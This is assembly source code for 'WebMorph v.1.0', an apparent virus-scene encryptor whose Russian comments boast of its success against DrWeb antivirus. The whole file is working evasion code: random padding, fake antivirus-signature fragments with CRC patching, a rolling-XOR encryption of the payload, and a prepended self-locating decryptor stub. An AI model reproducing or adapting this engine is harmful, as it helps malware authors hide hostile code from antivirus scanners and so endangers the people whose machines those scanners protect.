; WebMorph v.1.0 by Deviator/HAZARD

; Пока это только простейший шифровщик (не полиморфный генератор).
; Анти-эвристистики нету,но неплохо себя зарекомендовал с DrWeb'ом всех
; версий (желательно >4.12...)

WebMorph	proc		; ES:DI - Dest,DS:SI - source, CX - Len
	pusha
	mov	bp,sp
	mov	cx,300		; Очистим...
Fill:	xor	ax,ax
	Call	GetRnd
	stosb
	loop	Fill
	mov	ax,sigsn
	Call	GetRnd
	shl	ax,4		; Умножим на 16
	add	ax,offset Sigs
	xchg	ax,si
	Call	GenSig
	Call	GenSig
	xor	ax,ax
	Call	GetRND
	mov	1 ptr [DcKey],al; Сохраним ключ
	mov	ah,al
	mov	cx,[Bp][12]
	mov	2 ptr [DcLen],cx; Длина
	mov	si,offset Decr
	mov	cx,DecrL	; Пишим декриптор
rep	movsb
	mov	si,[bp][2]
	mov	cx,[bp][12]
DoXor:	lodsb
	xor	al,ah
	dec	ah
	stosb
	loop	DoXor
	mov	ax,di
	sub	ax,[bp][0]
	mov	[bp][12],ax	; Расчитали новый размер
	popa
	ret
WebMorph	endp

Seed	dw	1234h

GetRnd	proc
	push	cx dx ax
	in	ax,40h
	xor	ax,[Seed]
	mov	[Seed],ax
	pop	cx
	or	cx,cx
	jz	NoDiv
	xor	dx,dx
	div	cx
	xchg	ax,dx
NoDiv:	pop 	dx cx
	ret
GetRnd	endp

Patch	proc				; Подправим CRC
	xor	ah,al
	xor	dh,dl
	xchg	ah,al
	xchg	dh,dl
	ret
Patch	endp

GenSig	proc
	pusha
	xor	ax,ax
	lodsb

	push	ax
	mov	bx,[bp][0]
	lodsw
	add	bx,ax

	xor	cx,cx
	mov	cl,[si]
	xor	ax,ax
	mov	di,bx
rep	stosb

	pop	ax

	mov	[bx],al			; Кусок сигнатуры
	mov	2 ptr [bx][1],0129h	; Собственно Call
	cwd
	mov	ah,029h
	mov	dl,001h
	Call	Patch			; Подправим CRC
	mov	[bx][4],ax
	mov	[bx][6],dx		; Сохраним

	xor	ax,ax
	lodsb
	sub	ax,4			; Длина куска
	add	bx,ax
	lodsw
	push	ax
	lodsw
	xchg	ax,dx
	pop	ax
	xor	al,dh
	xor	ah,dl
	xor	ah,dh
	xchg	ah,al
	xchg	dh,dl
	mov	[bx],dx
	mov	[bx][2],ax
	popa
	add	si,8
	ret
GenSig	endp

;---------------------------------------------------------------------
Decr:	pop	ax
	Call	GetOfs
GetOfs:	pop	si
	add	si,offset DcEnd-GetOfs
	mov	cx,0
DcLen	equ	$ - 2
	mov	al,0
DcKey	equ	$ - 1
DoX:	xor	1 ptr ds:[si],al
	dec	al
	inc	si
	loop	DoX
DcEnd:
Decrl	equ	$ - Decr

include	sig.inc
